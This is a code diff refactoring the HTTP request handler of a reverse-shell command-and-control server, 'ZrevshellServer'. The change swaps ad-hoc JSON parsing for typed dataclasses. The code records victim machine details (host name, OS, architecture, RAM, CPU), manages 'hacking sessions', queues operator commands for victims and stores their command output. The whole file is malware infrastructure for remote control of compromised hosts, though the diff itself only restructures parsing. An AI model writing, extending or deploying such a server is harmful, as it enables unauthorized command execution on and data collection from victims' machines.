@@ -1,18 +1,56 @@
 """ The reverse shell server and request handler. """
 
 # ---- imports
-import json as js
-import sys
 import threading as th
 import time as tm
+import sys
 from binascii import Error as b64decodeError
+from dataclasses import dataclass
 from functools import partial
 from http import HTTPMethod, HTTPStatus
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from typing import Any, Callable
+from typing import Any, Callable, Optional
+
+import typ.json as js
 
 import reverse_shell.server.server_helper as sh
 import reverse_shell.utils as ut
+
+
+# ---- Dataclasses used for type safe json serialization
+@dataclass
+class VictimInfo:
+    host_name: Optional[str]
+    os: Optional[str]
+    arch: Optional[str]
+    ram: Optional[str]
+    clock_speed: Optional[str]
+
+
+# Unfortunately I couldn't find a way to turn TypedDicts definitions to
+# dataclasses so we'll be duplicating those we defined in the server_helper
+
+
+@dataclass
+class Output:
+    stdout: str
+    stderr: str
+
+
+@dataclass
+class PostResJsonBody:
+    session_id: str
+    response: Output
+    empty: bool
+    command_status_code: Optional[int]
+    failed_to_execute: bool
+
+
+@dataclass
+class PostCmdJsonBody:
+    session_id: str
+    command: str
+    empty: bool
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
@@ -147,25 +185,25 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def insert_victim_info_db(self, victim_id: str, json_str: str):
         """Insert victims info and specs to the victim_info database. returns None if some error happens"""
         try:
-            victim_info = js.loads(json_str)
-        except js.JSONDecodeError:
+            victim_info = js.loads(VictimInfo, json_str)
+        except (js.json.decoder.JSONDecodeError, js.JsonError):
             # Incase if the data the user sent is not valid json
             # we are going to set victim_info to None and later on set
             # the columns to null
             victim_info = None
 
         if victim_info is not None:
-            # Get all the info we need
-            host_name = victim_info.get("host_name", None)
-            os = victim_info.get("os", None)
-            arch = victim_info.get("arch", None)
-            clock_speed = victim_info.get("clock_speed", None)
-            ram = victim_info.get("ram", None)
-
             # Insert that to the victims database
             return self.database.execute(
                 "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
-                [victim_id, host_name, os, arch, clock_speed, ram],
+                [
+                    victim_id,
+                    victim_info.host_name,
+                    victim_info.os,
+                    victim_info.arch,
+                    victim_info.clock_speed,
+                    victim_info.ram,
+                ],
             )
         else:
             # Well we couldn't even parse the victim info so let's just
@@ -470,45 +508,30 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Let's try to decode the request's body into json
         try:
-            data = js.loads(req_body)
-        except js.JSONDecodeError:
-            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
-
-        session_id = data.get("session_id", None)
-        client_response = data.get("response", None)
-        is_empty = data.get("empty", None)
-        command_status_code = data.get(
-            "command_status_code", False
-        )  # Since the value was supposed to be None, we'll use False
-        # to represent the case where it wasn't found from the loaded requested body
-        failed_to_execute = data.get("failed_to_execute", None)
-
-        # Check if the necessary keys are not present in the dictionary sent
-        if (
-            session_id is None
-            or client_response is None
-            or command_status_code is False
-            or is_empty is None
-            or failed_to_execute is None
-        ):
+            data = js.loads(PostResJsonBody, req_body)
+        except (js.json.decoder.JSONDecodeError, js.JsonError):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
         validate_session_response = self.validate_session(
-            client_id, client_type, session_id
+            client_id, client_type, data.session_id
         )
         if validate_session_response.res_code == HTTPStatus.GONE:
             # That means the session is dead and we need to notify the victim
             # that it is. .i.e send the termination response code and also remove the session.
-            self.hacking_sessions.remove_session(session_id)
+            self.hacking_sessions.remove_session(data.session_id)
 
         if not validate_session_response.successful:
             return validate_session_response
 
-        if not is_empty:
+        if not data.empty:
             # Ok else, let's send the success code and insert the response in the session
             self.hacking_sessions.insert_response(
-                session_id, client_response, command_status_code, failed_to_execute
+                data.session_id,
+                data.response.stdout,
+                data.response.stderr,
+                data.command_status_code,
+                data.failed_to_execute,
             )
 
         return sh.HandlerResponse(True, HTTPStatus.OK)
@@ -526,28 +549,21 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         try:
             # Let's try to decode this fella
-            data = js.loads(req_body)
-        except js.JSONDecodeError:
+            data = js.loads(PostCmdJsonBody, req_body)
+        except (js.json.decoder.JSONDecodeError, js.JsonError):
             # Well if we fail to decode this then we can't proceed
             # so let's return the bad_request as an indicator
             return bad_request
 
-        session_id = data.get("session_id", None)
-        command = data.get("command", None)
-        empty = data.get("empty", None)
-
-        if session_id is None or command is None or empty is None:
-            return bad_request
-
         # Session validation
-        response = self.validate_session(client_id, client_type, session_id)
+        response = self.validate_session(client_id, client_type, data.session_id)
         if not response.successful:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
-        if not empty:
+        if not data.empty:
             # If we are in session with the victim and satisfy all the other requirements
             # we can proceed by inserting the command in the session comm.
-            self.hacking_sessions.insert_command(session_id, command)
+            self.hacking_sessions.insert_command(data.session_id, data.command)
 
         # If all went good, lets once again return the OK response
         return sh.HandlerResponse(True, HTTPStatus.CREATED)
